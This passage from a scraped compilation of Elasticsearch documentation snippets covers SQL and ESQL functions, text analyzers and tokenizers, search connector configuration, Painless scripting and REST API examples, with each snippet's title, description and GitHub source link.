<1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT MONTH_NAME(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS month;\\n\\n     month\\n---------------\\nFebruary\\n\"\n```\n\n----------------------------------------\n\nTITLE: Output Structure of SecurityManager Tool - CSV Format\nDESCRIPTION: This section describes the output format of the SecurityManager scanning tool, specifying the different columns that are returned in the output CSV file for each found entry point.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/securitymanager-scanner/README.md#2025-04-21_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\nThe columns are:\n1. Module name\n2. File name (from source root)\n3. Line number\n4. Fully qualified class name (ASM style, with \"/\" separators)\n5. Method name\n6. Method descriptor (ASM signature)\n7. Visibility (PUBLIC/PUBLIC-METHOD/PRIVATE)\n8. Check detail 1 (method name, or in case of checkPermission, permission name. Might be \"MISSING\")\n9. Check detail 2 (in case of checkPermission, the argument type (\"Permission\" subtype). Might be \"MISSING\")\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Column Alias\nDESCRIPTION: Example of using a column alias in the GROUP BY clause to group results by the gender column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g FROM emp GROUP BY g;\n```\n\n----------------------------------------\n\nTITLE: Parameter Documentation for ESQL Function\nDESCRIPTION: Documentation block specifying that the function accepts a field parameter that can be single or multi-valued column or expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_cartesianpoint.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Changing EQL Search Retention Period in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to change the retention period for an EQL search using the 'keep_alive' parameter. It sets a 2-day retention period and a 2-second wait for completion timeout.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_26\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"keep_alive\": \"2d\",\n  \"wait_for_completion_timeout\": \"2s\",\n  \"query\": \"\"\"\n    process where process.name == \"cmd.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Oracle Connector YAML File\nDESCRIPTION: This snippet provides an example of the YAML configuration file for the Oracle connector, including Elasticsearch connection details and connector settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: oracle\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing Commands\nDESCRIPTION: Commands for running functional tests against the Google Cloud Storage connector implementation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-cloud.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=google_cloud_storage\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=google_cloud_storage DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Field Alias in Elasticsearch\nDESCRIPTION: Shows how to create an index with a field alias mapping and perform a search query using the alias. The example creates an alias 'route_length_miles' pointing to a 'distance' field of type long.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/field-alias.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT trips\n{\n  \"mappings\": {\n    \"properties\": {\n      \"distance\": {\n        \"type\": \"long\"\n      },\n      \"route_length_miles\": {\n        \"type\": \"alias\",\n        \"path\": \"distance\"\n      },\n      \"transit_mode\": {\n        \"type\": \"keyword\"\n      }\n    }\n  }\n}\n\nGET _search\n{\n  \"query\": {\n    \"range\" : {\n      \"route_length_miles\" : {\n        \"gte\" : 39\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Tokenizer with Custom Rules in Elasticsearch\nDESCRIPTION: This example demonstrates how to create an Elasticsearch index with a custom ICU tokenizer using a user-defined rule file. It specifies the rule file location and creates a custom analyzer using this tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"tokenizer\": {\n          \"icu_user_file\": {\n            \"type\": \"icu_tokenizer\",\n            \"rule_files\": \"Latn:KeywordTokenizer.rbbi\"\n          }\n        },\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"icu_user_file\"\n          }\n        }\n      }\n    }\n  }\n}\n\nGET icu_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"Elasticsearch. Wow!\"\n}\n```\n\n----------------------------------------\n\nTITLE: Array to Nested Object Conversion in Synthetic _source for Flattened Fields\nDESCRIPTION: This example shows how synthetic _source converts an array of objects in a flattened field to a nested object structure. It creates an index with synthetic _source enabled and inserts a document with an array of objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"flattened\": { \"type\": \"flattened\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"flattened\": {\n      \"field\": [\n        { \"id\": 1, \"name\": \"foo\" },\n        { \"id\": 2, \"name\": \"bar\" },\n        { \"id\": 3, \"name\": \"baz\" }\n      ]\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n    \"flattened\": {\n      \"field\": {\n          \"id\": [ \"1\", \"2\", \"3\" ],\n          \"name\": [ \"bar\", \"baz\", \"foo\" ]\n      }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Result of Registered Domain Processor Simulation in Elasticsearch\nDESCRIPTION: This snippet shows the output of the registered domain processor simulation. It displays the extracted domain components including subdomain, registered domain, top-level domain, and full domain.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/registered-domain-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"docs\": [\n    {\n      \"doc\": {\n        ...\n        \"_source\": {\n          \"fqdn\": \"www.example.ac.uk\",\n          \"url\": {\n            \"subdomain\": \"www\",\n            \"registered_domain\": \"example.ac.uk\",\n            \"top_level_domain\": \"ac.uk\",\n            \"domain\": \"www.example.ac.uk\"\n          }\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Instanceof Operator Grammar in Painless\nDESCRIPTION: Specifies the grammar for the instanceof operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_7\n\nLANGUAGE: text\nCODE:\n```\ninstance_of: ID 'instanceof' TYPE;\n```\n\n----------------------------------------\n\nTITLE: Setting Max Concurrent Requests for Enrich Coordinator Proxy in Elasticsearch YAML\nDESCRIPTION: Configures the maximum number of concurrent multi-search requests for document enrichment. The default value is 8.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/enrich-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nenrich.coordinator_proxy.max_concurrent_requests: 8\n```\n\n----------------------------------------\n\nTITLE: Configuring Notion Connector in YAML\nDESCRIPTION: Example YAML configuration for the Notion connector when running as a self-managed connector using Docker. This configuration specifies the Elasticsearch host, API key, connector ID, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: notion\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Creating an Inference Pipeline in Elasticsearch\nDESCRIPTION: API call to create an inference pipeline for a language identification model. The pipeline is configured to process the 'text' field and store the result in the 'predicted_lang' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nPUT _ingest/pipeline/lang_ident_pipeline\n{\n  \"description\": \"Language identification pipeline\",\n  \"processors\": [\n    {\n      \"inference\": {\n        \"model_id\": \"lang_ident_model\",\n        \"target_field\": \"predicted_lang\",\n        \"field_map\": {\n          \"text\": \"text\"\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Kuromoji Tokenizer Configuration with Inline Rules\nDESCRIPTION: Elasticsearch configuration example showing how to set up a kuromoji tokenizer with inline user dictionary rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"tokenizer\": {\n          \"kuromoji_user_dict\": {\n            \"type\": \"kuromoji_tokenizer\",\n            \"mode\": \"extended\",\n            \"user_dictionary_rules\": [\"東京スカイツリー,東京 スカイツリー,トウキョウ スカイツリー,カスタム名詞\"]\n          }\n        },\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"kuromoji_user_dict\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Elasticsearch Create Index API Specification\nDESCRIPTION: This JSON snippet defines the specification for Elasticsearch's 'Create Index' API, detailing documentation links, stability state, URL paths, and parameters, emphasizing the mandatory live documentation link and stability state declaration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/README.markdown#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"indices.create\": {\n    \"documentation\":{\n      \"url\":\"https://www.elastic.co/guide/en/elasticsearch/reference/master/indices-create-index.html\"\n    },\n    \"stability\": \"stable\",\n    \"url\":{\n      \"paths\":[\n        {\n          \"path\":\"/{index}\",\n          \"method\":\"PUT\",\n          \"parts\":{\n            \"index\":{\n              \"type\":\"string\",\n              \"description\":\"The name of the index\"\n            }\n          }\n        }\n      ]\n    },\n    \"params\": {\n      \"timeout\": {\n        \"type\" : \"time\",\n        \"description\" : \"Explicit operation timeout\"\n      }\n    },\n    \"body\": {\n      \"description\" : \"The configuration for the index (`settings` and `mappings`)\"></span>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Profile API Response Structure Overview\nDESCRIPTION: The basic structure of the Profile API response showing the main sections including shard identification, query details, rewrite time, collectors, aggregations, and fetch phase information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   \"profile\": {\n        \"shards\": [\n           {\n              \"id\": \"[q2aE02wS1R8qQFnYu6vDVQ][my-index-000001][0]\",  <1>\n              \"node_id\": \"q2aE02wS1R8qQFnYu6vDVQ\",\n              \"shard_id\": 0,\n              \"index\": \"my-index-000001\",\n              \"cluster\": \"(local)\",             <2>\n              \"searches\": [\n                 {\n                    \"query\": [...],             <3>\n                    \"rewrite_time\": 51443,      <4>\n                    \"collector\": [...]          <5>\n                 }\n              ],\n              \"aggregations\": [...],            <6>\n              \"fetch\": {...}                    <7>\n           }\n        ]\n     }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Day of Year with DAY_OF_YEAR in SQL\nDESCRIPTION: Extracts the day of the year from a date/datetime expression. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_54\n\nLANGUAGE: sql\nCODE:\n```\n\"DAY_OF_YEAR(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DAY_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\\n\\n      day\\n---------------\\n50\\n\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Price Difference with Base Cost in Painless\nDESCRIPTION: A simple Painless script that calculates the difference between maximum and minimum values plus a base cost. It accesses values through the params map which contains both aggregation results and user-defined parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-bucket-script-agg-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\n(params.max - params.min) + params.base_cost\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch MongoDB Connector Docker Image\nDESCRIPTION: Docker command to run the Elasticsearch MongoDB connector service with configuration volume mount\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Function Call Operator Example in Painless\nDESCRIPTION: Shows how to define and call a function using the function call operator. Includes a simple addition function with two parameters and its usage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nint add(int x, int y) {\n    return x + y;\n}\n\nint z = add(1, 2);\n```\n\n----------------------------------------\n\nTITLE: Skipping tests based on platform in Java\nDESCRIPTION: This snippet shows how to use JUnit's `assumeTrue` method along with constants and methods from `Platforms.java` to skip tests that are only intended to run on specific platforms, such as Windows or systems using systemd.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/qa/packaging/README.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n```java\nassumeTrue(\"only run on windows\", Platforms.WINDOWS);\n\nassumeTrue(\"only run if using systemd\", Platforms.isSystemd());\n```\n```\n\n----------------------------------------\n\nTITLE: Creating and Testing Nori Analyzer with User Dictionary\nDESCRIPTION: Elasticsearch request to create an index with a custom analyzer using nori_tokenizer with a user dictionary, followed by analysis of Korean text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT nori_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"tokenizer\": {\n          \"nori_user_dict\": {\n            \"type\": \"nori_tokenizer\",\n            \"decompound_mode\": \"mixed\",\n            \"discard_punctuation\": \"false\",\n            \"user_dictionary\": \"userdict_ko.txt\",\n            \"lenient\": \"true\"\n          }\n        },\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"nori_user_dict\"\n          }\n        }\n      }\n    }\n  }\n}\n\nGET nori_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"세종시\"  <1>\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation with Missing Value Handling\nDESCRIPTION: Example showing how to handle documents with missing values in a histogram aggregation by specifying a default value. Documents missing the aggregated field will be treated as having the specified value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"quantity\": {\n      \"histogram\": {\n        \"field\": \"quantity\",\n        \"interval\": 10,\n        \"missing\": 0 <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using murmur3 Field for Cardinality Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates indexing documents and running a cardinality aggregation on a murmur3 hash field. The aggregation counts unique values, potentially improving performance for high-cardinality fields compared to running the same operation on the original field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-murmur3-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"my_field\": \"This is a document\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"my_field\": \"This is another document\"\n}\n\nGET my-index-000001/_search\n{\n  \"aggs\": {\n    \"my_field_cardinality\": {\n      \"cardinality\": {\n        \"field\": \"my_field.hash\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Content Document Example with Access Control Field in Elasticsearch\nDESCRIPTION: This code snippet illustrates a content document in Elasticsearch that incorporates an access control field (`_allow_access_control`) for implementing Document Level Security (DLS).  The `_allow_access_control` array lists the identities (users, groups) that have permission to view this document. If a user's identity matches an element in this array, they are granted access to the document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"some-unique-id\",\n  \"key-1\": \"value-1\",\n  \"key-2\": \"value-2\",\n  \"key-3\": \"value-3\",\n  \"_allow_access_control\": [\n    \"example.user@example.com\",\n    \"example group\",\n    \"example username\"\n  ]\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Vector field type update paths in Elasticsearch\nDESCRIPTION: Illustrates the allowed update paths for the 'type' setting in dense_vector field's index_options. Shows the progression from flat to more optimized types like int4_hnsw.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_10\n\nLANGUAGE: txt\nCODE:\n```\nflat --> int8_flat --> int4_flat --> hnsw --> int8_hnsw --> int4_hnsw\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Long Values Using TO_LONG in ESQL\nDESCRIPTION: Example showing how TO_LONG function converts string values to long data type. The function successfully converts numeric strings with and without decimal points, while non-numeric strings result in null values with appropriate warning headers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_long.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"2147483648\", str2 = \"2147483648.2\", str3 = \"foo\"\n| EVAL long1 = TO_LONG(str1), long2 = TO_LONG(str2), long3 = TO_LONG(str3)\n```\n\n----------------------------------------\n\nTITLE: Using PI Function in Elasticsearch SQL\nDESCRIPTION: Returns the mathematical constant PI (approximately 3.141592653589793). This function takes no input parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\nPI()\n```\n\n----------------------------------------\n\nTITLE: Using MV Slice to Extract Subset in ESQL\nDESCRIPTION: This code snippet demonstrates the use of the mv_slice function to return specific elements from a multivalued field. The function takes in a multivalued array and returns the elements from the specified start index to the end index. The expected output will be a subset of the original array based on the provided indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nrow a = [1, 2, 2, 3]\n| eval a1 = mv_slice(a, 1), a2 = mv_slice(a, 2, 3)\n```\n\n----------------------------------------\n\nTITLE: Equivalent Multi-field Search with Explicit Field References\nDESCRIPTION: Shows the equivalent query to a multi-field search, explicitly referencing each field. This illustrates how Elasticsearch expands field searches under the hood.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"(content:this OR name:this) AND (content:that OR name:that)\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: LIKE/RLIKE Pattern Matching in Elasticsearch SQL\nDESCRIPTION: Pattern matching operations using LIKE and RLIKE with wildcard and regexp queries. Includes complex boolean combinations with AND/OR conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test WHERE some.string LIKE '%a%';\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"query\":{\"wildcard\":{\"some.string.typical\":{\"wildcard\":\"*a*\"\n```\n\n----------------------------------------\n\nTITLE: Creating a match_only_text Field in Elasticsearch\nDESCRIPTION: This snippet shows how to use the match_only_text field type, a space-efficient variant of the text field that trades scoring and positional query efficiency for reduced storage requirements. It's suitable for log messages and other text that doesn't need precise scoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT logs\n{\n  \"mappings\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"message\": {\n        \"type\": \"match_only_text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Finding Maximum String in Keyword Array using MV_MAX in ESQL\nDESCRIPTION: Example demonstrating MV_MAX function usage with keyword (string) type arrays. Compares strings using their UTF-8 representation byte by byte, returning \"zoo\" as the maximum value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_max.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"zoo\", \"bar\"]\n| EVAL max_a = MV_MAX(a)\n```\n\n----------------------------------------\n\nTITLE: Foreach Processor Modifying Object Keys\nDESCRIPTION: Configuration of the Foreach processor that sets each object key to the value of its display_name field, effectively renaming keys based on display names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foreach\": {\n    \"field\": \"products\",\n    \"processor\": {\n      \"set\": {\n        \"field\": \"_ingest._key\",\n        \"value\": \"{{_ingest._value.display_name}}\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Output of Simple Analyzer\nDESCRIPTION: Provides the output of the simple analyzer, displaying a list of tokens generated from the analyzed text. The output showcases how the analyzer processes and tokenizes the text, stripping non-letter characters and normalizing the case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simple-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ the, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: Example of FLOOR Function Usage\nDESCRIPTION: Demonstrates using the FLOOR function with positive and negative decimal numbers, showing it returns the nearest integer less than or equal to the input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT FLOOR(125.01), FLOOR(-125.99);\n\n FLOOR(125.01) |FLOOR(-125.99)\n---------------+---------------\n125            |-126\n```\n\n----------------------------------------\n\nTITLE: Concurrent Shard Request Control in Elasticsearch\nDESCRIPTION: Example of controlling the maximum number of concurrent shard requests per node using the max_concurrent_shard_requests parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?max_concurrent_shard_requests=3\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Streaming a plugin from a download URL in Elasticsearch Service\nDESCRIPTION: Creates an extension by streaming a plugin file from a publicly-accessible download URL. This approach is required for plugins larger than 200MB. The download URL must be directly accessible with http or https protocol.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n   \"download_url\" : \"https://my_site/custom-plugin-8.4.3.zip\",\n   \"extension_type\" : \"plugin\",\n   \"name\" : \"custom-plugin\",\n   \"version\" : \"8.4.3\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Implementing Indonesian Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Indonesian analyzer with Indonesian stopwords, keyword marker for exclusions from stemming, and Indonesian stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nPUT /indonesian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"indonesian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_indonesian_\" <1>\n        },\n        \"indonesian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"contoh\"] <2>\n        },\n        \"indonesian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"indonesian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_indonesian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"indonesian_stop\",\n            \"indonesian_keywords\",\n            \"indonesian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Connector Configuration File\nDESCRIPTION: Configuration file for setting up Elasticsearch connection and Dropbox connector with authentication options\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: dropbox\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: ESQL Data Type Mapping Table\nDESCRIPTION: A markdown table showing the supported input angle types and their corresponding result types for an ESQL function. All input types (double, integer, long, unsigned_long) map to double as the result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| angle | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Simple Analyzer in Elasticsearch\nDESCRIPTION: Analyzer that divides text into terms on non-letter characters and lowercases all terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_1\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"simple\"\n```\n\n----------------------------------------\n\nTITLE: Enabling Metadata Fields Access in ESQL\nDESCRIPTION: Demonstrates how to enable access to metadata fields using the FROM source command with METADATA directive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-metadata-fields.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM index METADATA _index, _id\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch to Filter GCE Instances by Tags\nDESCRIPTION: YAML configuration for elasticsearch.yml that sets up GCE discovery with tag filtering. This configuration specifies the GCE project and zone, enables GCE as the seed provider, and filters instances by the 'elasticsearch' and 'dev' tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tags.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n  gce:\n    project_id: es-cloud\n    zone: europe-west1-a\ndiscovery:\n  seed_providers: gce\n    gce:\n      tags: elasticsearch, dev\n```\n\n----------------------------------------\n\nTITLE: Dropping Column Using ESQL\nDESCRIPTION: Demonstrates how to remove the 'height' column from the 'employees' table using ESQL's DROP clause. The query performs a simple column removal operation on the specified table.\nSOURCE: 